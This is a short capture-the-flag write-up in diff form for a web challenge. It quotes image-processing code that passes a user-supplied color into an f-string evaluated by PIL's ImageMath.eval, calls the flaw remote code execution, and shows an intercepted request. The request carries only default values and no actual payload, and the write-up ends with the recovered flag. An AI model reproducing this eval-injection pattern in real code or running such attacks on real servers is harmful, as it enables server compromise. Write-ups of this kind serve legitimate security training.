@@ -1,0 +1,65 @@
+access: http://159.65.81.48:31204/
+
+let's upload jpg on ufo logo picture, intercept using burpsuite:
+
+take attention this code:
+def make_alpha(data):
+	color = data.get('background', [255,255,255])
+
+	try:
+		dec_img = base64.b64decode(data.get('image').encode())
+
+		image = Image.open(BytesIO(dec_img)).convert('RGBA')
+		img_bands = [band.convert('F') for band in image.split()]
+
+		alpha = ImageMath.eval(
+			f'''float(
+				max(
+				max(
+					max(
+					difference1(red_band, {color[0]}),
+					difference1(green_band, {color[1]})
+					),
+					difference1(blue_band, {color[2]})
+				),
+				max(
+					max(
+					difference2(red_band, {color[0]}),
+					difference2(green_band, {color[1]})
+					),
+					difference2(blue_band, {color[2]})
+				)
+				)
+			)''',
+
+eval arbitraty code execution on python.
+change json payload request to this:
+POST /api/alphafy HTTP/1.1
+Host: 159.65.81.48:31204
+Content-Length: 166459
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://159.65.81.48:31204
+Referer: http://159.65.81.48:31204/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"image":"base64_encode","background":[255,255,255]}
+
+{
+  "image": "base64_encode",
+  "background": [
+    255,
+    255,
+    255
+  ]
+}
+
+access: http://159.65.81.48:31204/static/images/flag.txt
+result:
+HTB{sl33p1ng_my_way_into_RCE}
+
+resource:
+https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-amidst-us-write-up-a6864e23c3b9
